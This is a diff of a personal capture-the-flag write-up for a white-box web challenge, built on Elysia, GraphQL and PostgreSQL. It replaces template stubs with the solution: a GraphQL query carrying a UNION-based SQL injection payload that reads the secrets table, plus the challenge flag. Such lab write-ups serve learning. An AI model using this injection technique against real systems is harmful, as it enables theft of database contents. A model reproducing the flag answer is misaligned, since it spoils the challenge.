@@ -9,7 +9,7 @@ creation_date: 2026-02-14
 last_modified: 2026-02-14
 ---
 
-# 🚩 [[(incomplete) BKSEC - Cutie Web Framework]]
+# 🚩 [[BKSEC - Cutie Web Framework]]
 **Primary:** [[01 - Web Security]]
 
 **Secondary:** [[02 - (incomplete) Data Exfiltration]]
@@ -24,10 +24,9 @@ last_modified: 2026-02-14
 ---
 
 ## First Look
-### The white box
-This is a white box challenge so I decide to take time and learn more about the given technology and some of the syntax of TypeScript.
+This is a white box challenge so I decided to take time and learn more about the given technology and some of the syntax of TypeScript.
 
-The syntax is oddly similar to python in a sense. It's a rather short file so I managed to divide the content into different parts.
+The syntax is oddly similar to python in a sense. It's a rather short file so I divided the content into different parts.
 
 **Import**
 ```typescript
@@ -205,68 +204,43 @@ const app = new Elysia()
   )
   .listen(3000)
 ```
-### Web Enumeration
 
-- **Technologies:** (Apache, PHP, etc.)
-    
-- **Fuzzing Results:**
-    
-    - `/admin` (403)
-        
-    - `/images` (200)
-        
+Overall, there are a few things we can take note about the system:
+- The database used was **PostgreSQL**.
+- The flag is stored in the `value` column of the `secrets` table
+- The system is using **GraphQL** as a query language for the front-end and the search route is implementing a vulnerable `unsafe()` method that can allow **SQLi**.
+
+We can solve this problem with a simple UNION-based attack payload that can break the `LIKE` statement and return the flag.
 
 ---
+## SQL Injection
+Going to the `/graphql` endpoint, I navigatede to a page that looks like this:
 
-## Foothold (User)
+![[Pasted image 20260222094835.png]]
 
-**Path:** <% tp.file.cursor(1) %>
+I study a bit about GraphQL's query syntax and craft a non-malicious, generic query that the system would expect.
 
-### Step 1: Discovery
-
-(What did you find?)
-
-### Step 2: Exploitation
-
-(The exact payload or exploit used).
-
-> [!failure] 🐇 Rabbit Hole I spent time trying to brute force SSH.
-> 
-> - **Correction:** Always check for `id_rsa` keys in web directories first.
->     
-
----
-
-## Privilege Escalation (Root)
-
-**Current User:** `www-data`
-
-### Enumeration
-
-- **LinPeas Findings:** `Vulnerable Sudo version`
-    
-
-### Exploitation
-
-Bash
-
+**Payload:** 
+```graphql
+query {
+  search (username: "admin") {username,  role}
+}
 ```
-# Commands to get root
+
+![[Pasted image 20260222100025.png]]
+
+Then based on the that, I send the **UNION payload**. Since the query return 2 columns (as written in the white-box code) I do not need to enumerate the number of columns anymore: 
+
+**Payload:**
+```graphql
+query {
+  search (username: "admin%' UNION SELECT name, value FROM secrets--") {username,  role}
+}
 ```
+
+![[Pasted image 20260222101403.png]]
 
 ---
 
 ## Loot & Flags
-
-- [ ] **User Flag:** `hash_here`
-    
-- [ ] **Root Flag:** `hash_here`
-    
-- [ ] **Credentials:**
-    
-    - `user:password`
-        
-
----
-
-**References:** [Link](https://www.google.com/search?q=url)
+**FLag:** BKSEC{ef1599df66849bb7389821d97b96ace1244d68f4e6917467210a6fc8ff6ff664}
